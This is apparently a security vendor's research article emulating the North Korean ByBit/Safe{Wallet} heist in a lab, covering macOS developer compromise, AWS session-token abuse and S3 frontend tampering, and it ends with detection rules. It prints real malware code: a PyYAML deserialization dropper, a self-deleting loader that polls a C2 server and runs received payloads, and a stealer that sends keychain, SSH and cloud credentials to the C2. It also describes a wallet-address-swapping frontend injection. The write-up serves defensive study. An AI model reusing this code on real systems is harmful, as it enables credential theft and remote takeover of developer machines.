---
title: "Bit ByBit - emulation of the DPRK's largest cryptocurrency heist"
slug: "bit-bybit"
date: "2025-05-06"
description: "A high-fidelity emulation of the DPRK's largest cryptocurrency heist via a compromised macOS developer and AWS pivots."
author:
  - slug: colson-wilhoit
  - slug: terrance-dejesus
image: "bit-bybit.jpg"
category:
  - slug:  attack-pattern
  - slug:  detection-science
---

## Key takeaways

Key takeaways from this research:

- PyYAML was deserialization as initial access vector
- The attack leveraged session token abuse and AWS lateral movement
- Static site supply chain tampering
- Docker-based stealth on macOS
- End-to-end detection correlation with Elastic

## Introduction

On February 21, 2025, the crypto world was shaken when approximately 400,000 ETH vanished from ByBit —one of the industry’s largest cryptocurrency exchanges. Behind this incredible theft is believed to be North Korea’s elite cyber-offensive unit, referred to as [TraderTraitor](https://www.ic3.gov/PSA/2025/PSA250226). Exploiting a trusted vendor relationship with Safe\{Wallet\}, a multisig (multi-signature) wallet platform, TraderTraitor transformed a routine transaction into a billion-dollar heist. Supply chain targeting has become a hallmark of the DPRK’s cyber strategy, underpinning the regime’s theft of more than [$6 billion](https://www.chainalysis.com/blog/crypto-hacking-stolen-funds-2025/) in cryptocurrency since 2017. In this article we’ll dissect this attack, carefully emulate its tactics within a controlled environment, and provide practical lessons to reinforce cybersecurity defenses using Elastic’s product and features. 

Our emulation of this threat is based on research released by [Sygnia](https://www.sygnia.co/blog/sygnia-investigation-bybit-hack/), [Mandiant/SAFE](https://x.com/safe/status/1897663514975649938), [SlowMist](https://slowmist.medium.com/cryptocurrency-apt-intelligence-unveiling-lazarus-groups-intrusion-techniques-a1a6efda7d34), and [Unit42](https://unit42.paloaltonetworks.com/slow-pisces-new-custom-malware/).

![](/assets/images/bit-bybit/image12.png)

## Chronology of events

If you're here for the technical emulation details, feel free to skip ahead. But for context— and to clarify what was officially reported— we've compiled a high-level timeline of events to ground our assumptions based on the research referenced above.

**February 2, 2025** – Infrastructure Setup


The attacker registers the domain getstockprice[.]com via Namecheap. This infrastructure is later used as the C2 endpoint in the initial access payload.

**February 4, 2025** – Initial Compromise


Developer1’s macOS workstation is compromised after executing a malicious Python application. This application contained Docker-related logic and referenced the attacker’s domain. The file path (`~/Downloads/`) and malware behavior suggest social engineering (likely via Telegram or Discord, consistent with past [REF7001](https://www.elastic.co/security-labs/elastic-catches-dprk-passing-out-kandykorn) and UNC4899 tradecraft).

**February 5, 2025** – AWS Intrusion Begins



Attacker successfully accesses Safe\{Wallet\}’s AWS environment using Developer1’s active AWS session tokens.Attacker attempts (unsuccessfully) to register their own virtual MFA device to Developer1’s IAM user, indicating a persistence attempt.

**February 5–17**: Reconnaissance activity begins within the AWS environment. During this time, attacker actions likely included the enumeration of IAM roles, S3 buckets, and other cloud assets.

**February 17, 2025** – AWS Command and Control Activity


Confirmed C2 traffic observed in AWS. This marks the shift from passive reconnaissance to active staging of the attack.

**February 19, 2025** – Web Application Tampering


A snapshot of app.safe.global (Safe\{Wallet\}’s statically hosted Next.js web app) captured by the Wayback Machine shows the presence of malicious JavaScript. The payload was crafted to detect a Bybit multisig transaction and modify it on-the-fly, redirecting funds to the attacker’s wallet.

**February 21, 2025** – Execution and Cleanup


The exploit transaction is executed against Bybit via the compromised Safe\{Wallet\} frontend.

A new Wayback Machine snapshot confirms the JavaScript payload has been removed—indicating the attacker manually scrubbed it post-execution.

The Bybit heist transaction is finalized. Approximately 400,000 ETH is stolen. Subsequent analysis by Sygnia and others confirms that Bybit infrastructure was not directly compromised—Safe\{Wallet\} was the sole point of failure.

## Assumptions for emulation 

* Initial Social Engineering Vector:
Social engineering was employed to compromise Developer1, resulting in the execution of a malicious Python script. The exact details of the social engineering tactic (such as specific messaging, impersonation techniques, or the communication platform used) remain unknown.
* Loader and Second-Stage Payload:
The malicious Python script executed a second-stage loader. It is currently unclear whether this loader and subsequent payloads match those detailed in Unit42's reporting, despite alignment in the initial access Python application's characteristics.
* Safe Application Structure and Workflow:
The compromised application (`app.global.safe`) appears to be a Next.js application hosted statically in AWS S3. However, specific details such as its exact routes, components, development processes, version control methods, and production deployment workflow are unknown.
* JavaScript Payload Deployment:
While attackers injected malicious JavaScript into the Safe\{Wallet\} application, it is unclear whether this involved rebuilding and redeploying the entire application or merely overwriting/modifying a specific JavaScript file.
* AWS IAM and Identity Management Details:
Details regarding Developer1’s IAM permissions, roles, and policy configurations within AWS are unknown. Additionally, whether Safe\{Wallet\} used AWS IAM Identity Center or alternative identity management solutions remains unclear.
* AWS Session Token Retrieval and Usage:
While reports confirm the attackers used temporary AWS session tokens, details about how Developer1 originally retrieved these tokens (such as through AWS SSO, `GetSessionToken`, or specific MFA configurations) and how they were subsequently stored or utilized (e.g., environment variables, AWS config files, custom scripts) are unknown.
* AWS Enumeration and Exploitation Techniques:
The exact tools, enumeration methodologies, AWS API calls, and specific actions carried out by attackers within the AWS environment between February 5 and February 17, 2025, remain undisclosed.
* AWS Persistence Mechanisms:
Although there is an indication of potential persistence within AWS infrastructure (e.g., via EC2 instance compromise), explicit details including tools, tactics, or persistence methods are not provided.

## Overview of the attack

Targeting companies within the crypto ecosystem is a common occurrence. DPRK continually targets these companies due to the relative anonymity and decentralized nature of cryptocurrency, enabling the regime to evade global financial sanctions. North Korea's offensive cyber groups excel at identifying and exploiting vulnerabilities, resulting in billions of dollars in losses.

This intrusion began with the [targeted compromise](https://x.com/safe/status/1897663514975649938?s=09) of a developer's MacOS workstation at Safe\{Wallet\}, ByBit’s trusted multi-signature wallet provider. Initial access involved social engineering, likely approaching the developer via platforms like LinkedIn, Telegram, or Discord, based on previous campaigns, and convincing them to download an archive file containing a crypto-themed Python application—an initial access procedure favored by DPRK. This Python application also included a Dockerized version of the application that could be run inside a privileged container. Unknown to the developer, this seemingly benign application enabled DPRK operators to exploit a remote code execution (RCE) [vulnerability](https://www.cvedetails.com/cve/CVE-2017-18342/) in the PyYAML library, providing code execution capabilities and subsequently control over the host system.

After gaining initial access to the developer's machine, attackers deployed [MythicC2](https://github.com/its-a-feature/Mythic)'s [Poseidon agent](https://github.com/MythicAgents/poseidon), a robust Golang-based payload offering advanced stealth and extensive post-exploitation capabilities for macOS environments. The attackers then may have conducted reconnaissance, discovering the developer's access to Safe\{Wallet\}’s AWS environment and the usage of temporary AWS user session tokens secured via multi-factor authentication (MFA). Armed with the developer's AWS access key ID, secret key, and temporary session token, the threat actors then authenticated into Safe\{Wallet\}’s AWS environment within approximately 24 hours, capitalizing on the 12-hour validity of the session tokens.

Attempting to ensure persistent access to the AWS environment, the attackers tried to register their own MFA device. However, AWS temporary session tokens do not permit IAM API calls without [MFA authentication context](https://docs.aws.amazon.com/STS/latest/APIReference/API_GetSessionToken.html#:~:text=You%20cannot%20call%20any%20IAM,in%20the%20IAM%20User%20Guide), causing this attempt to fail. Following this minor setback, the threat actor enumerated the AWS environment, eventually discovering an S3 bucket hosting Safe\{Wallet\}'s static Next.js user interface.

The attackers could then have downloaded this Next.js application’s bundled code, spending nearly two weeks analyzing its functionality before injecting malicious JavaScript into the primary JS file and overwriting the legitimate version hosted in the S3 bucket. The malicious JavaScript code was activated exclusively on transactions initiated from Bybit’s cold wallet address and an attacker-controlled address. By inserting hardcoded parameters, the script circumvented transaction validation checks and digital signature verifications, effectively deceiving ByBit wallet approvers who implicitly trusted the Safe\{Wallet\} interface.

Shortly thereafter, the DPRK initiated a fraudulent transaction, triggering the malicious script to alter transaction details. This manipulation, likely, contributed to misleading the wallet signers into approving the illicit transfer, thereby granting DPRK operatives control of approximately 400,000 ETH. These stolen funds were then laundered into attacker-controlled wallets. 

We chose to end our research and behavior emulation at the compromise of the Next.js application. Thus, we do not dive into the blockchain technologies, such as ETH smart contracts, contract addresses, and sweep ETH calls discussed in several other research publications.

## Emulating the attack

To truly understand this breach we decided to emulate the entire attack chain in a controlled lab environment. As security researchers at Elastic, we wanted to walk in the footsteps of the attacker to understand how this operation unfolded at each stage: from code execution to AWS session hijacking and browser-based transaction manipulation.

This hands-on emulation served a dual purpose. First, it allowed us to analyze the attack at a granular, technical level to uncover practical detection and prevention opportunities. Second, it gave us the chance to test Elastic’s capabilities end-to-end—to see whether our platform could not only detect each phase of the attack, but also correlate them into a cohesive narrative that defenders could act on.

### MacOS endpoint compromise

Thanks to [Unit42](https://unit42.paloaltonetworks.com/)’s detailed write-up—and more critically, uploading recovered samples to VirusTotal—we were able to emulate the attack end-to-end using the actual payloads observed in the wild. This included:

* PyYAML deserialization payload
* Python loader script
* Python stealer script

#### Malicious Python Application 

The initial access Python application we used in our emulation aligns with samples highlighted and shared by [SlowMist](https://www.slowmist.com/) and corroborated by Mandiant's [incident response findings](https://x.com/safe/status/1897663514975649938) from the SAFE developer compromise. This application also matched the directory structure of the application shown by Unit42 in their write-up. Attackers forked a legitimate stock-trading Python project from GitHub and backdoored it within a Python script named `data_fetcher.py`.

![Python Application Directory Structure](/assets/images/bit-bybit/image13.png)

The application leverages [Streamlit](https://streamlit.io/) to execute `app.py`, which imports the script `data_fetcher.py`.

![Python Application README.txt usage](/assets/images/bit-bybit/image5.png)

The `data_fetcher.py` script includes malicious functionality designed to reach out to an attacker-controlled domain.

![data_fetcher.py class with yaml.load functionality](/assets/images/bit-bybit/image8.png)

The script, by default, fetches valid stock market-related data. However, based on specific conditions, the attacker-controlled server can return a malicious YAML payload instead. When evaluated using PyYAML’s unsafe loader (`yaml.load()`), this payload allows for arbitrary Python object deserialization, resulting in RCE.

#### PyYAML Deserialization Payload 

(VT Hash: `47e997b85ed3f51d2b1d37a6a61ae72185d9ceaf519e2fdb53bf7e761b7bc08f`)

We recreated this malicious setup by hosting the YAML deserialization payload on a Python+Flask web application, using PythonAnywhere to mimic attacker infrastructure. We updated the malicious URL in the `data_fetcher.py` script to point to our PythonAnywhere-hosted YAML payload.

When PyYAML loads and executes the malicious YAML payload, it performs the following actions:

First, it creates a directory named `Public` in the victim’s home directory.

```py
directory = os.path.expanduser("~")
directory = os.path.join(directory, "Public")

if not os.path.exists(directory):
    os.makedirs(directory)
```

Next, it decodes and writes a base64-encoded Python loader script into a new file named `__init__.py` within the `Public` directory.

```py
filePath = os.path.join(directory, "__init__.py")

with open(filePath, "wb") as f:
    f.write(base64.b64decode(b"BASE64_ENCODED_LOADER_SCRIPT"))
```

Finally, it executes the newly created `__init__.py` script silently in the background, initiating the second stage of the attack.

```py
subprocess.Popen([sys.executable, filePath], start_new_session=True, stdout=DEVNULL, stderr=DEVNULL)
```

#### Python Loader Script 

(VT Hash: `937c533bddb8bbcd908b62f2bf48e5bc11160505df20fea91d9600d999eafa79`)

To avoid leaving forensic evidence, the loader first deletes its file (`__init__.py`) after execution, leaving it running in memory only.

```py
directory = os.path.join(home_directory, "Public")

    if not os.path.exists(directory):
        os.makedirs(directory)

    try:
        body_path = os.path.join(directory, "__init__.py")
        os.remove(body_path)
```

This loader’s primary goal is to establish continuous communication with the Command-and-Control (C2) server. It gathers basic system information—like OS type, architecture, and system version—and sends these details to the C2 via an HTTP POST request to the hardcoded /club/fb/status URL endpoint. 

```py
params = {
        "system": platform.system(),
        "machine": platform.machine(),
        "version": platform.version()
    }
    while True:
        try:
            response = requests.post(url, verify=False, data = params, timeout=180)
```

Based on the server’s response (ret value), the loader decides its next steps.

##### ret == 0:

The script sleeps for 20 seconds and continues polling. 

```py
if res['ret'] == 0:
    time.sleep(20)
    continue
```

##### ret == 1:

The server response includes a payload in Base64. The script decodes this payload, and writes it to a file—named `init.dll` if on Windows or `init` otherwise—and then dynamically loads the library using `ctypes.cdll.LoadLibrary`, which causes the payload to run as a native binary.

```py
elif res['ret'] == 1:
    if platform.system() == "Windows":
        body_path = os.path.join(directory, "init.dll")
    else:
        body_path = os.path.join(directory, "init")
        with open(body_path, "wb") as f:
            binData = base64.b64decode(res["content"])
            f.write(binData)
            os.environ["X_DATABASE_NAME"] = ""
            ctypes.cdll.LoadLibrary(body_path)
```

##### ret == 2:

The script decodes the Base64 content into Python source code and then executes it using Python’s `exec()` function. This allows for running arbitrary Python code.

```py
elif res['ret'] == 2:
    srcData = base64.b64decode(res["content"])
    exec(srcData)
```

##### ret == 3:

The script decodes a binary payload (`dockerd`) and a binary configuration file (`docker-init`) into two separate files, sets their permissions to be executable, and then attempts to run them as a new process, supplying the config file as an argument to the binary payload. After execution of the binary payload, it deletes its executable file, leaving the config file on disk for reference.

```py
elif res['ret'] == 3:
    path1 = os.path.join(directory, "dockerd")
    with open(path1, "wb") as f:
        binData = base64.b64decode(res["content"])
        f.write(binData)

    path2 = os.path.join(directory, "docker-init")
    with open(path2, "wb") as f:
        binData = base64.b64decode(res["param"])
        f.write(binData)

    os.chmod(path1, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR |
                    stat.S_IRGRP | stat.S_IXGRP |
                    stat.S_IROTH | stat.S_IXOTH)

    os.chmod(path2, stat.S_IRUSR | stat.S_IWUSR | stat.S_IXUSR |
                    stat.S_IRGRP | stat.S_IXGRP |
                    stat.S_IROTH | stat.S_IXOTH)

    try:
        process = subprocess.Popen([path1, path2], start_new_session=True)
        process.communicate()
        return_code = process.returncode
        requests.post(SERVER_URL + '/club/fb/result', verify=False, data={"result": str(return_code)})
    except:
        pass

    os.remove(path1)
```

##### ret == 9:

The script breaks out of its polling loop, terminating further actions.

```py
elif res['ret'] == 9:
    break
```

After processing any command, the script continues to poll for further instructions from the C2 server.

#### Python Loader Emulation

Our goal was to test each of the command options within the loader to better understand what was happening, collect relevant telemetry data, and analyze it for the purpose of building robust detections for both our endpoint and the SIEM.

**Ret == 1: Write Library to Disk, Load and Delete Dylib**

The payload we used for this option was a [Poseidon](https://github.com/MythicAgents/poseidon) payload compiled as a shared library (`.dylib`). 

![Mythic C2 Payload Builder](/assets/images/bit-bybit/image9.png)

We then base64-encoded the binary and were able to hardcode the path to that base64-encoded payload in our C2 server to be served when testing this specific loader command.

```shell
base64 poseidon.dylib > poseidon.b64
```

```py
BINARY_PAYLOAD_B64 = "BASE64_ENCODED_DYLIB_PAYLOAD"  # For ret==1
STEALER_PAYLOAD_B64 = "BASE64_ENCODED_STEALER_SCRIPT" # For ret==2
MULTI_STAGE_PAYLOAD_B64 = "BASE64_ENCODED_MULTISTAGE_PAYLOAD" # For ret==3
# For testing we simulate a command to send.
# Options: 0, 1, 2, 3, 9.
# 0: Idle (sleep); 1: Execute native binary; 2: Execute Python code; 3: Execute multi-stage payload; 9: Terminate.
COMMAND_TO_SEND = 1   # Change this value to test different actions
```

Once we received our Poseidon payload callback to our [Mythic C2](https://github.com/its-a-feature/Mythic) we were able to retrieve credentials using a variety of different methods provided by Poseidon. 

Option 1: [download command](https://github.com/MythicAgents/poseidon/blob/master/documentation-payload/poseidon/commands/download.md) \- Access file, reads content, sends data back to C2.  
Option 2: [getenv command](https://github.com/MythicAgents/poseidon/blob/master/documentation-payload/poseidon/commands/getenv.md) \- Read user environment variables and send content back to C2.  
Option 3: [jsimport](https://github.com/MythicAgents/poseidon/blob/master/Payload_Type/poseidon/poseidon/agentfunctions/jsimport.go) & [jsimport\_call](https://github.com/MythicAgents/poseidon/blob/master/Payload_Type/poseidon/poseidon/agentfunctions/jsimport_call.go) commands \- Import JXA script into memory then call a method within the JXA script to retrieve credentials from file and return contents.

#####  Ret == 2: Receive and Execute arbitrary Python code within Process Memory 

(VT Hash: `e89bf606fbed8f68127934758726bbb5e68e751427f3bcad3ddf883cb2b50fc7`)

The loader script allows for the running of arbitrary Python code or scripts, in memory. In Unit42’s blog they provided a Python script they observed the DPRK executing via this return value. This script collects a vast amount of data. This data is XOR encoded and sent back to the C2 server via a POST request. For the emulation all that was needed was to add our C2 URL with the appropriate route as defined in our C2 server and base64 encode the script hardcoding its path within our server for when this option was tested.

```py
def get_info():
    global id
    id = base64.b64encode(os.urandom(16)).decode('utf-8')
    
    # get xor key
    while True:
        if not get_key():
            break

        base_info()
        send_directory('home/all', '', home_dir)
        send_file('keychain', os.path.join(home_dir, 'Library', 'Keychains', 'login.keychain-db'))
        send_directory('home/ssh', 'ssh', os.path.join(home_dir, '.ssh'), True)
        send_directory('home/aws', 'aws', os.path.join(home_dir, '.aws'), True)
        send_directory('home/kube', 'kube', os.path.join(home_dir, '.kube'), True)
        send_directory('home/gcloud', 'gcloud', os.path.join(home_dir, '.config', 'gcloud'), True)
        finalize()
        break
```

##### Ret == 3: Write Binary Payload and Binary Config to Disk, Execute Payload and Delete File

For ret == 3 we used a standard Poseidon binary payload and a “configuration file” containing binary data as specified in the loader script. We then base64 encoded both the binary and config file like the ret == 1 option above and hardcoded their paths in our C2 server for serving when testing this command. Same as the ret == 1 option above we were able to use those same commands to collect credentials from the target system.

#### C2 Infrastructure

We created a very simple and small C2 server, built with Python+Flask, intended to listen with a specified port on our Kali Linux VM and evaluate incoming requests, responding appropriately based on the route and return value we wished to test. 

![Custom Python+Flask C2 Server](/assets/images/bit-bybit/image15.png)

We also used the open source [Mythic C2](https://github.com/its-a-feature/Mythic) in order to facilitate the creation and management of the Poseidon payloads we used. Mythic is an open source C2 framework created and maintained by [Cody Thomas](https://github.com/its-a-feature) at [SpecterOps](https://specterops.io/). 

![Mythic C2 Active Callbacks Interactive Agent Window](/assets/images/bit-bybit/image14.png)

#### Malicious Python Application: Docker Version

We also explored a Dockerized variant of the malicious Python application. This version was packaged in a minimal Python Docker container (python:3.12.2-slim) running in privileged mode, granting it the ability to access host resources.

A containerized application creates a telemetry and detection blind spot on macOS because Apple's Endpoint Security Framework (ESF) lacks the ability to introspect containerized processes. While ESF and endpoint detection solutions can still observe the trusted Docker process accessing sensitive host files—such as SSH keys, AWS credentials, or user configuration data—these actions commonly align with standard developer workflows. As a result, security tools are less likely to scrutinize or trigger alerts on containerized activities, offering attackers increased stealth when operating from within Docker environments.

This highlights the necessity for additional monitoring like [OSQuery](https://www.osquery.io/) and [Docker](https://www.docker.com/) log file collection to complement standard macOS endpoint defenses. Elastic offers both [OSQuery](https://www.elastic.co/docs/reference/integrations/osquery_manager) and [Docker](https://www.elastic.co/docs/reference/beats/filebeat/filebeat-input-container) log file collection via our [data integrations](https://www.elastic.co/integrations/data-integrations) for Elastic Agent alongside our Endpoint protection features.

#### MacOS Emulation Conclusion

Our emulation recreated the attack against the SAFE developers’ macOS system end-to-end using the real world payloads.

**Malicious Python App:**

We began by replicating the malicious Python application described in both Mandiant’s findings and Unit42’s report. The attackers had forked a legitimate open-source application and embedded RCE access within `data_fetcher.py`. This script made outbound requests to an attacker-controlled server and conditionally fetched a malicious YAML file. Using PyYAML’s `yaml.load()` with an unsafe loader, the attacker triggered arbitrary code execution via deserialization.

**PyYAML Payload Deserialization resulting in Python Loader Script Execution:**

The YAML payload wrote a base64-encoded second-stage loader to `~/Public/__init__.py` and executed it in a detached process. We mimicked this exact flow using a Flask-based staging server hosted on PythonAnywhere.

**Python Loader Execution & C2 Interaction:**

Once launched, the loader deleted its on disk file and beaconed to our emulated C2, awaited tasking. Based on the C2’s response code (`ret`), we tested the following actions:

* **ret == 1**: The loader decoded a Poseidon payload (compiled as a `.dylib`) and executed it using `ctypes.cdll.LoadLibrary()`, resulting in native code execution from disk.
* **ret == 2**: The loader executed an in-memory Python stealer, matching the script shared by Unit42. This script collected system, user, browser, and credential data and exfiltrated it via XOR-encoded POST requests.
* **ret == 3**: The loader wrote a Poseidon binary and a separate binary configuration file to disk, executed the binary with the config as an argument, then deleted the payload.
* **ret == 9**: The loader terminated its polling loop.

**Data Collection: Pre-Pivot Recon & Credential Access:**

During our **ret == 2** test, the Python stealer gathered:

* macOS system information (`platform`, `os`, `user`)
* Chrome user data (Bookmarks, Cookies, Login Data, etc.)
* SSH private keys (`~/.ssh`)
* AWS credentials (`~/.aws/credentials`)
* macOS Keychain files (`login.keychain-db`)
* GCP/Kube config files from `.config/`

This emulates the pre-pivot data collection that preceded cloud exploitation, and reflects how DPRK actors harvested AWS credentials from the developer’s local environment.

With valid AWS credentials, the threat actors then pivoted into the cloud environment, launching the second phase of this intrusion.

![AWS cloud compromise execution flow](/assets/images/bit-bybit/image22.png)

### AWS cloud compromise

#### Pre-requisities and Setup

To emulate the AWS stage of this attack, we first leveraged Terraform to stand up the necessary infrastructure. This included creating an IAM user (developer) with an overly permissive IAM policy granting access to S3, IAM, and STS APIs. We then pushed a locally built Next.js application to an S3 bucket and confirmed the site was live, simulating a simple Safe\{Wallet\} frontend. 

Our choice of `Next.js` was predicated on the original S3 bucket static site path - `https://app[.]safe[.]global/_next/static/chunks/pages/_app-52c9031bfa03da47.js`

Before injecting any malicious code, we verified the integrity of the site by performing a test transaction using a known target wallet address to ensure the application responded as expected.

![Transaction by custom frontend static site](/assets/images/bit-bybit/image1.png)

#### Temporary Session Token Retrieval

Following the initial access and post-compromise activity on the developer’s macOS workstation, early assumptions focused on the adversary retrieving credentials from default AWS configuration locations - such as `~/.aws` or from user environment variables. It was later confirmed by Unit42’s blog that the Python stealer script targeted AWS files. These locations often store long-term IAM credentials or temporary session tokens used in standard development workflows. Based on public reporting, however, this specific compromise involved AWS user session tokens, not long-term IAM credentials. In our emulation, as the developer we added our virtual MFA device to our IAM user, enabled it and then retrieved our user session token and exported the credentials to our environment. Note that on our Kali Linux endpoint, we leveraged ExpressVPN - as done by the adversaries - for any AWS API calls or interactions with the developer box.

It is suspected that the developer obtained temporary AWS credentials either by the [GetSessionToken](https://docs.aws.amazon.com/STS/latest/APIReference/API_GetSessionToken.html) API operation or by logging in via AWS Single Sign-On (SSO) using the AWS CLI. Both methods result in short-lived credentials being cached locally and usable for CLI or SDK-based interactions. These temporary credentials were then likely cached in the `~/.aws` files or exported as environment variables on the macOS system.

In the *GetSessionToken* scenario, the developer would have executed a command as such:

```shell
aws sts get-session-token --serial-number "$ARN" --token-code "$FINAL_CODE"  --duration-seconds 43200 --profile "$AWS_PROFILE" --output json
```

In the SSO-based authentication scenario, the developer may have run:

```shell
aws configure sso 
aws sso login -profile "$AWS_PROFILE" -use-device-code "OTP"`
```

Either method results in temporary credentials (access key, secret and session token) being saved in `~/.aws` files and made available to the configured AWS profile. These credentials are then used automatically by tools like the AWS CLI or SDKs like Boto3 unless overridden. In either case, if malware or an adversary had access to the developer’s macOS system, these credentials could have been easily harvested from the environment variables, AWS config cache or credentials file.

To obtain these credentials for Developer1 were created a custom script for quick automation. It created a virtual MFA device in AWS, registered the device with our Developer1 user, then called `GetSessionToken` from STS - adding the returned temporary user session credentials to our macOS endpoint as environment variables as shown below.

#### MFA Device Registration Attempts

![Registering our MFA device for the developer and retrieving user session token via shellscript](/assets/images/bit-bybit/image20.png)

One key assumption here is that the developer was working with a user session that had MFA enabled, either for direct use or to assume a custom-managed IAM role. Our assumption derives from the credential material compromised - AWS temporary user session tokens, which are not obtained from the console but rather requested on demand from STS. Temporary credentials returned from `GetSessionToken` or SSO by default expire after a certain number of hours, and a session token with the ASIA* prefix would suggest that the adversary harvested a short-lived but high-impact credential. This aligns with behaviors seen in previous DPRK-attributed attacks where credentials and configurations for Kubernetes, GCP, and AWS were extracted and reused.

![Environment variables output of our AWS user session token after GetSessionToken call](/assets/images/bit-bybit/image11.png)

#### Assuming the Compromised Identity on Kali

Once the AWS session token was collected, the adversary likely stored it on their Kali Linux system either in the standard AWS credential locations (e.g., `~/.aws/credentials` or as environment variables) or potentially in a custom file structure, depending on tooling in use. While the AWS CLI defaults to reading from `~/.aws/credentials` and environment variables, a Python script leveraging Boto3 could be configured to source credentials from nearly any file or path. Given the speed and precision of the post-compromise activity, it is plausible that the attacker used either the AWS CLI, direct Boto3 SDK calls, or shell scripts wrapping CLI commands - all of which offer convenience and built-in request signing.

What seems less likely is that the attacker manually signed AWS API requests using SigV4, as this would be unnecessarily slow and operationally complex. It’s also important to note that no public blog has disclosed which user agent string was associated with the session token usage (e.g. aws-cli, botocore, etc.), which leaves uncertainty around the attacker’s exact tools. That said, given DRPK’s established reliance on Python and the speed of the attack, CLI or SDK usage remains the most reasonable assumption.

![MythicC2 getenv command output](/assets/images/bit-bybit/image16.png)

**Note:** We did this in emulation with our Poseidon payload prior to Unit 42’s blog about the RN Loader capabilities.

It’s important to clarify a nuance about the AWS authentication model: using a session token does not [inherently block access to IAM API actions](https://docs.aws.amazon.com/IAM/latest/UserGuide/id_credentials_temp_control-access_getsessiontoken.html) - even actions like [CreateVirtualMFADevice](https://docs.aws.amazon.com/IAM/latest/APIReference/API_CreateVirtualMFADevice.html) - as long as the session was initially established with MFA. In our emulation, we attempted to replicate this behavior using a stolen session token that had MFA context. Interestingly, our attempts to register an additional MFA device failed, suggesting that there may be additional safeguards, such as explicit policy constraints, that prevent MFA registration via session tokens or the details of this behavior are still too vague and we incorrectly mimicked the behavior. While the exact failure reason remains unclear, this behavior warrants deeper investigation into the IAM policies and authentication context associated with session-bound actions.

#### S3 Asset Enumeration

After credential acquisition, the attacker likely enumerated accessible AWS services. In this case, Amazon S3 was a clear target. The attacker would have listed buckets available to the compromised identity across all regions and located a public-facing bucket associated with Safe\{Wallet\}, which hosted the frontend Next.js application for transaction processing. 

We assume the attacker was aware of the S3 bucket due to its role in serving content for `app.safe[.]global`, meaning the bucket's structure and assets could be publicly browsed or downloaded without authentication. In our emulation, we validated similar behavior by syncing assets from a public S3 bucket used for static site hosting.

![Bucket containing statically hosted frontend static site assets](/assets/images/bit-bybit/image6.png)

![Statically hosted frontend static site assets in target bucket](/assets/images/bit-bybit/image21.png)

#### Next.js App Overwrite with Malicious Code

After discovering the bucket, the attacker likely used the aws s3 [sync](https://docs.aws.amazon.com/cli/latest/reference/s3/sync.html) command to download the entire contents, which included the bundled frontend JavaScript assets. Between February 5 and February 19, 2025, they appeared to focus on modifying these assets - specifically, files like `main.<HASH>.js` and related routes, which are output by `Next.js` during its build process and stored under the `_next/static/chunks/pages/` directory. These bundled files contain the transpiled application logic, and according to Sygnia's forensic report, a file named `_app-52c9031bfa03da47.js` was the primary injection point for the malicious code.

![Leveraging AWS CLI sync command to download bucket contents](/assets/images/bit-bybit/image23.png)

Next.js applications, when built, typically store their statically generated assets under the `next/static/` directory, with JavaScript chunks organized into folders like `/chunks/pages/`. In this case, the adversary likely formatted and deobfuscated the JavaScript bundle to understand its structure, then reverse engineered the application logic. After identifying the code responsible for handling user-entered wallet addresses, they injected their [payload](`https[:]//web[.]archive[.]org/web/20250219172905/https[:]//app[.]safe[.]global/_next/static/chunks/pages/_app-52c9031bfa03da47[.]js`). This payload introduced conditional logic: if the entered wallet address matched one of several known target addresses, it would silently replace the destination with a DPRK-controlled address, redirecting funds without the user becoming aware.

![](/assets/images/bit-bybit/image4.png)

![Modifying the non-formatted bundled static site code of our own app](/assets/images/bit-bybit/image7.png)

In our emulation, we replicated this behavior by modifying the `TransactionForm.js` component to check if the entered recipient address matched specific values. If so, the address was replaced with an attacker-controlled wallet. While this does not reflect the complexity of actual smart contract manipulation or delegate calls used in the real-world attack, it serves as conceptual behavior to illustrate how a compromised frontend could silently redirect cryptocurrency transactions.

![Our static site frontend script pop-up notifying the target wallet address condition was met after malicious code upload](/assets/images/bit-bybit/image2.png)

#### Static Site Tampering Implications and Missing Security Controls

This type of frontend tampering is especially dangerous in Web3 environments, where decentralized applications (dApps) often rely on static, client-side logic to process transactions. By modifying the JavaScript bundle served from the S3 bucket, the attacker was able to subvert the application’s behavior without needing to breach backend APIs or smart contract logic.

We assume that protections such as [S3 Object Lock](https://docs.aws.amazon.com/AmazonS3/latest/userguide/object-lock.html), Content-Security-Policy (CSP), or Subresource Integrity (SRI) headers were either not in use or not enforced during the time of compromise. The absence of these controls would have allowed an attacker to modify static frontend code without triggering browser or backend integrity validation, making such tampering significantly easier to carry out undetected.

## Lessons in defense

A successful emulation—or real-world incident response—doesn’t end with identifying attacker behaviors. It continues with reinforcing defenses to prevent similar techniques from succeeding again. Below, we outline key detections, security controls, mitigation strategies, and Elastic features that can help reduce risk and limit exposure to the tactics used in this emulation and in-the-wild (ItW) campaigns like the Safe\{Wallet\} compromise.

**Note:** These detections are actively maintained and regularly tuned, and may evolve over time. Depending on your environment, additional tuning may be required to minimize false positives and reduce noise.

## Elastic’s SIEM detection and endpoint prevention rules

Once we understand adversary behavior through emulation and implement security controls to harden the environment, it’s equally important to explore detection opportunities and capabilities to identify and respond to these threats in real time.

Once we understand adversary behavior through emulation and implement security controls to harden the environment, it’s equally important to explore detection opportunities and capabilities to identify and respond to these threats in real time.

#### [MacOS Endpoint Behavior Prevention Rules](https://github.com/elastic/protections-artifacts/tree/main/behavior/rules/macos)

##### Python PyYAML Deserialization Payload

**Rule Name: “[Python Script Drop and Execute](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/execution_python_script_drop_and_execute.md)”:** Detects when a Python script gets created or modified followed immediately by the execution of that script by the same Python process.

##### Python Loader Script

**Rule Name: “[Self-Deleting Python Script](https://github.com/elastic/detection-rules/blob/bbfc026c95fbd9491cdbd06e779e1598ad63a31f/hunting/macos/docs/defense_evasion_self_deleting_python_script.md)”:** Detects when a Python script executes and that script file is immediately deleted by the same Python process.

**Rule Name: “[Self-Deleted Python Script Outbound Connection](https://github.com/elastic/detection-rules/blob/84966f02a1b71cce13db22b6c348cb46560529b7/hunting/macos/docs/defense_evasion_self_deleted_python_script_outbound_network_connection.md)”:** Detects when a Python script gets deleted and an outbound network connection occurs shortly after by the same Python process. 

##### Python Loader Script Ret == 1

**Rule Name: “[Suspicious Executable File Creation via Python](https://github.com/elastic/detection-rules/blob/84966f02a1b71cce13db22b6c348cb46560529b7/hunting/macos/docs/command_and_control_suspicious_executable_file_creation_via_python.md)”:** Detects when an executable file gets created or modified by Python in suspicious or unusual directories. 

